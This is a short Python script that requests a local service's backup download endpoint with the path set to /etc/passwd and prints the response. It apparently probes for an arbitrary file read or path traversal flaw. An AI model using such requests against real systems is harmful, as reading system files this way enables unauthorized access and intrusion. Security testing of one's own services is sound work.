import requests
url = "http://127.0.0.1:5150/v1/backup/download?path=/etc/passwd"
resp = requests.get(url)
print(f"Status: {resp.status_code}")
print(f"Body: {resp.text}")
